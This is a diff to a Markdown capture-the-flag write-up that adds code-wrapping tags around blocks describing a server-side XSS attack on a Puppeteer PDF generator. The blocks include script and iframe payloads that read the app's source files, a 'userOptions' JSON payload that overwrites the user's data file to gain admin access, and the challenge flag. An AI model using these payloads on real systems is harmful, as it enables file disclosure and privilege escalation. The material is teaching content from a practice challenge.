@@ -39,9 +39,11 @@ We can update three sections of our profile; `First name`, `Last name` and `Spot
 
 Now we have found HTML injection, we can try and [server-side XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) to identify the file structure.
 
+{% code overflow="wrap" %}
 ```js
 <script>document.body.append(location.href)</script>
 ```
+{% endcode %}
 
 Returns `file:///app/tmp/3c433348-60e3-4a48-b989-2a168954147f.html`
 
@@ -49,12 +51,15 @@ Since we confirmed the file location as `/app`, we can enumerate common files, e
 
 #### app/app.js
 
+{% code overflow="wrap" %}
 ```js
 <iframe src="/app/app.js" style="width: 999px; height: 999px"></iframe>
 ```
+{% endcode %}
 
 We'll quickly recover the source code for `app.js`.
 
+{% code overflow="wrap" %}
 ```js
 const express = require("express");
 const { engine } = require("express-handlebars");
@@ -74,17 +79,21 @@ app.listen(3000, () => {
     console.log("Listening on port 3000...");
 });
 ```
+{% endcode %}
 
 This introduces some new paths to investigate (`/routes/index` and `/routes/api`) so we repeat the previous technique.
 
 #### app/routes/index.js
 
+{% code overflow="wrap" %}
 ```js
 <iframe src="/app/routes/index.js" style="width: 999px; height: 999px"></iframe>
 ```
+{% endcode %}
 
 `index.js` confirms our target is the `/admin` endpoint. Currently, when we try to access the page we get `Only admins can view this page`.
 
+{% code overflow="wrap" %}
 ```js
 const express = require("express");
 const { requireAuth } = require("../middleware/auth");
@@ -122,17 +131,21 @@ router.get("/admin", isAdmin, (req, res) => {
 });
 module.exports = router;
 ```
+{% endcode %}
 
 It also revealed some new paths (`/middleware/auth`, `/middleware/check_admin`, `/utils/recommendedSongs` and `/utils/generateProfileCard`), which we'll return to shortly.
 
 #### app/routes/api.js
 
+{% code overflow="wrap" %}
 ```js
 <iframe src="/app/routes/api.js" style="width: 999px; height: 999px"></iframe>
 ```
+{% endcode %}
 
 `api.js` deals with the register/login/update functionality, nothing particularly interesting.
 
+{% code overflow="wrap" %}
 ```js
 const express = require("express");
 const { body, cookie } = require("express-validator");
@@ -176,20 +189,24 @@ router
     );
 module.exports = router;
 ```
+{% endcode %}
 
 However, it does give us a new file to check out (`/controllers/user`).
 
 #### app/controllers/user.js
 
+{% code overflow="wrap" %}
 ```js
 <iframe
     src="/app/controllers/user.js"
     style="width: 999px; height: 999px"
 ></iframe>
 ```
+{% endcode %}
 
 This file is responsible for adding, updating and _verifying_ users.
 
+{% code overflow="wrap" %}
 ```js
 const {
     createUser,
@@ -255,20 +272,24 @@ const updateUserData = (req, res, next) => {
     }
 };
 ```
+{% endcode %}
 
 We find a `/services/user` endpoint, which might be interesting since the `getUser(loginHash)` function is imported from there.
 
 #### app/controllers/user.js
 
+{% code overflow="wrap" %}
 ```js
 <iframe
     src="/app/services/user.js"
     style="width: 999px; height: 999px"
 ></iframe>
 ```
+{% endcode %}
 
 Now we learn more about how users are stored!
 
+{% code overflow="wrap" %}
 ```js
 const fs = require("fs");
 const path = require("path");
@@ -309,11 +330,13 @@ const userExists = (loginHash) => {
 };
 module.exports = { createUser, getUser, setUserData, userExists };
 ```
+{% endcode %}
 
 First of all we see the `./data` folder, useful knowledge as we already have a method of reading (maybe writing) files.
 
 Secondly, we discover how user files are formatted.
 
+{% code overflow="wrap" %}
 ```js
 const loginHash = createHash("sha256").update(uuidv4()).digest("hex");
 fs.writeFileSync(
@@ -321,24 +344,30 @@ fs.writeFileSync(
     JSON.stringify(userData)
 );
 ```
+{% endcode %}
 
 Since our login hash is displayed on the page, we know exactly where our user object is located.
 
+{% code overflow="wrap" %}
 ```bash
 /app/data/25d6a4cec174932f1effd56e2273be5198c3be06ddf03ab380a7ffc4cf3ef4e8.json
 ```
+{% endcode %}
 
 #### app/middleware/check_admin.js
 
 Returning back to the four new endpoints we found in `app/routes/index.js`. The most interesting is likely to be `check_admin.js`. Why is this most interesting to us? Because we want to be admin, of course!
 
+{% code overflow="wrap" %}
 ```js
 <iframe
     src="/app/middleware/check_admin.js"
     style="width: 999px; height: 999px"
 ></iframe>
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```js
 const { getUser, userExists } = require("../services/user");
 const isAdmin = (req, res, next) => {
@@ -363,6 +392,7 @@ const isAdmin = (req, res, next) => {
 };
 module.exports = { isAdmin };
 ```
+{% endcode %}
 
 OK, so the `userData` JSON object will be parsed, and if the `isAdmin` property isn't `true`, we won't be granted access.
 
@@ -372,6 +402,7 @@ Another question we may consider; what happens if the JSON object cannot be pars
 
 Let's revisit the code from `/app/routes/index.js`. Specifically, the `generate-profile-card` POST request.
 
+{% code overflow="wrap" %}
 ```js
 router.post("/profile/generate-profile-card", requireAuth, async (req, res) => {
     const pdf = await generatePDF(req.userData, req.body.userOptions);
@@ -379,20 +410,24 @@ router.post("/profile/generate-profile-card", requireAuth, async (req, res) => {
     res.send(pdf);
 });
 ```
+{% endcode %}
 
 We already knew that our `userData` would be inserted to the PDF (that's how we were able to inject code), but what's this `userOptions` parameter? Let's go find out!
 
 #### app/utils/generateProfileCard.js
 
+{% code overflow="wrap" %}
 ```js
 <iframe
     src="/app/utils/generateProfileCard.js"
     style="width: 999px; height: 999px"
 ></iframe>
 ```
+{% endcode %}
 
 We found this endpoint earlier when checking `/app/routes/index.js`.
 
+{% code overflow="wrap" %}
 ```js
 const puppeteer = require("puppeteer");
 const fs = require("fs");
@@ -430,15 +465,18 @@ const generatePDF = async (userData, userOptions) => {
 };
 module.exports = { generatePDF };
 ```
+{% endcode %}
 
 This part is notable; our `userOptions` are passed as options to the `pdf` function in puppeteer.
 
+{% code overflow="wrap" %}
 ```js
 if (userOptions) {
     options = { ...options, ...userOptions };
 }
 const pdf = await page.pdf(options);
 ```
+{% endcode %}
 
 Time to [RTFM](https://pptr.dev/api/puppeteer.pdfoptions) 🤷‍♂️
 
@@ -462,6 +500,7 @@ OK, enough with the recon. exploit time!
 
 Putting all this together, we create a payload that will overwrite our user object with a generated PDF.
 
+{% code overflow="wrap" %}
 ```json
 {
     "userOptions": {
@@ -469,6 +508,7 @@ Putting all this together, we create a payload that will overwrite our user obje
     }
 }
 ```
+{% endcode %}
 
 We send this payload in the POST request used to generate a PDF (make sure to set content-type to `application/json`). When we login with the hash and return to `/admin`, we get the flag.
 
@@ -476,6 +516,7 @@ Flag:`INTIGRITI{0verr1d1ng_4nd_n0_r3turn_w4s_n3ed3d_for_th15_fl4g_to_b3_e4rn3d}`
 
 Note: I used this technique to overwrite our existing user object with a PDF (invalid JSON), but you could pick a filename of your choice, e.g.
 
+{% code overflow="wrap" %}
 ```json
 {
     "userOptions": {
@@ -483,5 +524,6 @@ Note: I used this technique to overwrite our existing user object with a PDF (in
     }
 }
 ```
+{% endcode %}
 
 Then just login with the hash `cat` and visit the admin page to receive the flag 😊
